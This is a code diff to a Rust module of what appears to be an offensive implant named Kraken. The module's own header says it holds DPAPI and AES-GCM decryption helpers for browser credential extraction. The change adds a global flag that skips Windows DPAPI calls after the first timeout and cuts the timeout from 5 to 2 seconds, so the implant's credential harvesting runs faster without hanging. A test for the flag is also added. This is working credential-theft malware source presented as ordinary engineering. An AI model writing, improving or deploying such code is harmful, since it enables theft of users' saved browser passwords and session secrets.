@@ -1,6 +1,22 @@
 //! DPAPI and AES-GCM decryption helpers for browser credential extraction
 
 use common::KrakenError;
+use std::sync::atomic::{AtomicBool, Ordering};
+
+/// Global flag indicating DPAPI is unavailable for this session.
+///
+/// When a DPAPI call times out it almost certainly means we are running in a
+/// context where DPAPI will *never* succeed (SYSTEM service, non-interactive
+/// logon, missing user hive, etc.).  Rather than blocking for 2 seconds on
+/// every subsequent browser profile, we set this flag on the first timeout and
+/// short-circuit all future calls immediately.
+static DPAPI_UNAVAILABLE: AtomicBool = AtomicBool::new(false);
+
+/// Returns `true` if a previous DPAPI call already timed out, meaning all
+/// future calls in this session will also fail.
+pub fn dpapi_is_unavailable() -> bool {
+    DPAPI_UNAVAILABLE.load(Ordering::Relaxed)
+}
 
 /// Decrypt data using Windows DPAPI (CryptUnprotectData).
 ///
@@ -9,12 +25,21 @@ use common::KrakenError;
 /// because it tries to contact the DPAPI service using the calling thread's
 /// user context, which may not exist or may be unreachable. To prevent the
 /// implant task from hanging, the DPAPI call is executed on a dedicated thread
-/// with a 5-second timeout. If the call does not return within that window the
-/// thread is abandoned and an error is returned immediately.
+/// with a 2-second timeout. If the call does not return within that window the
+/// thread is abandoned, a module-wide flag is set to skip all subsequent DPAPI
+/// calls, and an error is returned immediately.
 #[cfg(windows)]
 pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
     use std::sync::mpsc;
     use std::time::Duration;
+
+    // Fast path: if a previous call already timed out, don't bother spawning
+    // another thread — DPAPI will not work for the remainder of this session.
+    if DPAPI_UNAVAILABLE.load(Ordering::Relaxed) {
+        return Err(KrakenError::Module(
+            "DPAPI unavailable (previous call timed out — skipping)".into(),
+        ));
+    }
 
     // Clone the data so it can be moved into the worker thread safely.
     let data_owned = data.to_vec();
@@ -27,12 +52,17 @@ pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
         let _ = tx.send(result);
     });
 
-    match rx.recv_timeout(Duration::from_secs(5)) {
+    match rx.recv_timeout(Duration::from_secs(2)) {
         Ok(Ok(plaintext)) => Ok(plaintext),
         Ok(Err(msg)) => Err(KrakenError::Module(msg)),
-        Err(mpsc::RecvTimeoutError::Timeout) => Err(KrakenError::Module(
-            "DPAPI decryption timed out (non-interactive session or missing user context)".into(),
-        )),
+        Err(mpsc::RecvTimeoutError::Timeout) => {
+            // Mark DPAPI as permanently unavailable for this session so that
+            // all subsequent calls return immediately instead of blocking.
+            DPAPI_UNAVAILABLE.store(true, Ordering::Relaxed);
+            Err(KrakenError::Module(
+                "DPAPI decryption timed out (non-interactive session or missing user context)".into(),
+            ))
+        }
         Err(mpsc::RecvTimeoutError::Disconnected) => Err(KrakenError::Module(
             "DPAPI worker thread terminated unexpectedly".into(),
         )),
@@ -110,6 +140,7 @@ pub fn aes_gcm_decrypt(key: &[u8], encrypted: &[u8]) -> Result<Vec<u8>, KrakenEr
 
 #[cfg(not(windows))]
 pub fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, KrakenError> {
+    DPAPI_UNAVAILABLE.store(true, Ordering::Relaxed);
     Err(KrakenError::Module("DPAPI only supported on Windows".into()))
 }
 
@@ -128,6 +159,14 @@ mod tests {
     #[cfg(not(windows))]
     fn test_dpapi_unsupported() {
         assert!(dpapi_decrypt(&[0u8; 16]).is_err());
+    }
+
+    #[test]
+    #[cfg(not(windows))]
+    fn test_dpapi_flag_set_after_failure() {
+        // On non-Windows, the first call sets the flag
+        let _ = dpapi_decrypt(&[0u8; 16]);
+        assert!(dpapi_is_unavailable());
     }
 
     #[test]
